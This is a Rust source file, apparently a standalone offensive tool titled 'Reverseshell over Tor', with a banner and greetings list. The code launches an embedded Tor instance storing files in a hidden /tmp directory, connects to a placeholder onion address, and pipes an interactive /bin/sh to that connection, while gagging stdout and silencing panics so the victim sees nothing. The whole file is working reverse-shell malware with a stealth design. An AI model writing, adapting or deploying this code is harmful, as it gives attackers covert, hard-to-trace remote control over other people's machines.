/*
__   __  _______  ______    _______  __   __
|  | |  ||       ||    _ |  |       ||  | |  |
|  |_|  ||  _____||   | ||  |  _____||  |_|  |
|       || |_____ |   |_||_ | |_____ |       |
|       ||_____  ||    __  ||_____  ||       |
|   _   | _____| ||   |  | | _____| ||   _   |
|__| |__||_______||___|  |_||_______||__| |__|

                Reverseshell over Tor

gr33tz:
    - Thugcrowd
    - Stack Overflow
    - BLM. FDT.
    - MagicalBitcoin for porting libtor to Rust
    - Tor project, donate here: https://donate.torproject.org/

*/

use std::panic;
use std::process;
use std::error::Error;
use std::{thread, time};
use std::process::{Command, Stdio};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::net::{IpAddr, Ipv4Addr, SocketAddr};

use gag::Gag;
use tor_stream::TorStream;
use libtor::{Tor, TorFlag};

// START CONFIG

// Onion listener address and port
const ONION_LISTENER: &str = "changeme.onion:1337"; // onionaddress:port

// The proxy port we would be running Tor on. By default this is 9050 on most Tor installs
const LOCAL_TORPORT: u16 = 6699;

// END CONFIG

fn shell() -> Result<(), Box<dyn Error>> {
    // suppress all application output (stdout)
    let _print_gag = Gag::stdout().unwrap();

    // Spawn Tor instance in a separate thread with libtor
    thread::spawn(|| {
        // We store Tor's files in /tmp/.zsession, you can set this to whatever you want. /tmp is good because it's usually writable
        Tor::new()
            .flag(TorFlag::DataDirectory("/tmp/.zsession".into()))
            .flag(TorFlag::SocksPort(LOCAL_TORPORT))
            .start().map_err(|err| println!("{:?}", err)).ok();
    });

    // Sleep for 15 seconds while we wait on Tor to wake up. This may need to change if the connection speed is ass.
    thread::sleep(time::Duration::from_millis(15000));

    // stream shell over our tor instance with torstream
    let torsock = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), LOCAL_TORPORT);
    let torstream = TorStream::connect_with_address(torsock, ONION_LISTENER).expect("Failed to connect").unwrap();
    let fd = torstream.as_raw_fd();

    // shell
    Command::new("/bin/sh")
        .arg("-is")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
    Ok(())
}

fn main() {
    // Hook panics, and don't do anything. This is probably not what we should be doing...but it suppresses panic outputs
    panic::set_hook(Box::new(|_info| { }));
    if let Err(_err) = shell() {
        process::exit(1);
    }
}
